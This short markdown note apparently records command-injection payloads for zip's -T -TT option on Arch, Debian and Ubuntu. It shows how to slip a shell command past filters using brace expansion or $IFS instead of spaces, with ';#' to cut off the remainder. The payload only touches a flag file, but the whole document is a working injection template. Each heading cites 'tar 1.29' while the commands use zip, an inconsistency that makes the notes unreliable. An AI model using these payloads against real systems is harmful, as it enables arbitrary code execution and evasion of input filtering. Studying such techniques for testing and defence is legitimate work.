## archlinux (tar 1.29)
Allows for `{,}` format:
```
zip output /proc/self/status -T -TT '{touch,/tmp/flag};'
```

## debian (tar 1.29)
Allows for `$IFS`, but not `{,}` format:
```
zip output /proc/self/status -T -TT 'touch$IFS/tmp/flag;#'
```

## ubuntu (tar 1.29)
Allows for `$IFS`, but not `{,}` format:
```
zip output /proc/self/status -T -TT 'touch$IFS/tmp/flag;#'
```
